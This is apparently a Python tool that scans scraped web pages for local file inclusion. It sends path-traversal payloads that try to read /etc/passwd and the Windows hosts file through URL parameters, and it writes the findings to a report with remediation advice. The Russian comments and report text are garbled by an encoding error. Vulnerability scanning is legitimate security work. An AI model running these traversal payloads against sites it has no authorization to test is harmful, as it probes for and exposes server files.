import asyncio
import aiohttp
import logging
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def test_lfi(session, base_url, param):
    lfi_payloads = [
        'passwd',
        'etc/passwd',
        '../../../../etc/passwd',
        '../../../../../../windows/system32/drivers/etc/hosts',
        '../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../windows/system32/drivers/etc/hosts'
    ]
    for payload in lfi_payloads:
        # –§–æ—Ä–º–∏—Ä—É–µ–º URL –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –∑–∞–º–µ–Ω—è—è –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –∞ –Ω–µ –¥–æ–±–∞–≤–ª—è—è –Ω–æ–≤—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä
        payloaded_url = f"{base_url.split('?')[0]}?{param}={payload}"
        logger.info(f"Testing LFI with URL: {payloaded_url}")
        try:
            response = await session.get(payloaded_url)
            response_text = await response.text()
            logger.info(f"Response for {payloaded_url}: {response_text[:100]}")  # –õ–æ–≥–∏—Ä—É–µ–º –ø–µ—Ä–≤—ã–µ 100 —Å–∏–º–≤–æ–ª–æ–≤ –æ—Ç–≤–µ—Ç–∞
            if 'root:' in response_text or '127.0.0.1' in response_text:
                logger.info(f"LFI vulnerability found: {payloaded_url}")
                return True, payloaded_url
        except Exception as e:
            logger.error(f"Error testing LFI payload on {base_url}: {e}")
    return False, None

async def analyze_lfi(scraped_data):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        for page in scraped_data:
            url = page['URL']
            params = page.get('Parameters', {})
            for param in params:
                logger.info(f"Analyzing URL: {url} with param: {param}")
                is_vulnerable, vulnerable_url = await test_lfi(session, url, param)
                if is_vulnerable:
                    vulnerabilities.append({
                        'url': url,
                        'parameter': param,
                        'is_vulnerable': True,
                        'type': 'LFI',
                        'payload': vulnerable_url,
                        'description': (
                            "LFI (Local File Inclusion) —É—è–∑–≤–∏–º–æ—Å—Ç—å –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É —á–∏—Ç–∞—Ç—å –ª–æ–∫–∞–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, "
                            "–∏—Å–ø–æ–ª—å–∑—É—è –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–µ –ø—É—Ç–∏ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö URL."
                        ),
                        'risk_level': "üî¥ –í—ã—Å–æ–∫–∏–π",
                        'recommendation': (
                            "–î–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è LFI –∞—Ç–∞–∫ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è:\n"
                            "1. –ü—Ä–æ–≤–µ—Ä—è—Ç—å –∏ —Ñ–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å –≤—Å–µ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, –∏—Å–∫–ª—é—á–∞—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã—Ö –ø—É—Ç–µ–π.\n"
                            "2. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ–ª—ã–µ —Å–ø–∏—Å–∫–∏ –¥–æ–ø—É—Å—Ç–∏–º—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤, —Å–≤—è–∑–∞–Ω–Ω—ã—Ö —Å —Ñ–∞–π–ª–∞–º–∏.\n"
                            "3. –û—Ç–∫–ª—é—á–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –≤–∫–ª—é—á–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤, –µ—Å–ª–∏ –æ–Ω–∏ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è.\n"
                            "4. –†–µ–≥—É–ª—è—Ä–Ω–æ –æ–±–Ω–æ–≤–ª—è—Ç—å –∏ –ø–∞—Ç—á–∏—Ç—å –ü–û.\n"
                        )
                    })
    return vulnerabilities

def load_scraped_data(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        logger.info(f"Scraped data loaded from {file_path}")
        return data
    except Exception as e:
        logger.error(f"Error loading scraped data from {file_path}: {e}")
        return []

if __name__ == '__main__':
    scraped_data = load_scraped_data('scraped_data.json')
    vulnerabilities = asyncio.run(analyze_lfi(scraped_data))
    with open('lfi_vulnerabilities.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=4)
